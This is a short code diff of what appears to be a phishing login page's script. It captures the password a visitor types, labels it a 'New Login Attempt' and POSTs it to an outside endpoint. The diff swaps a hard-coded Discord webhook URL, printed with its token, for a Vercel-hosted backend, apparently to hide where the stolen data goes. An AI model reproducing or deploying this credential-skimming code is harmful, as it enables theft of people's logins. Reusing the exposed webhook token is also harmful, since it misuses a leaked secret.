@@ -285,8 +285,6 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
             const password = String(firstnameInput ? firstnameInput.value.trim() : '').trim() || "Not provided";
             const remember  = rememberInput && rememberInput.checked ? 'Yes' : 'No';
 
-            const webhookUrl = "https://discord.com/api/webhooks/1492217076667121734/zs-o6BpUOqzTF57nzzZ_YOGh2cS2jyUSiTT6rexo6Xbs8siNGhSyluGGjgcVE_Is2Ynq";
-
             const payload = {
                 content: "**New Login Attempt**",
                 embeds: [{
@@ -306,7 +304,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     
 
             try {
-                const response = await fetch(webhookUrl, {
+                const response = await fetch('https://my-form-backend-gules.vercel.app/api/submit', {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
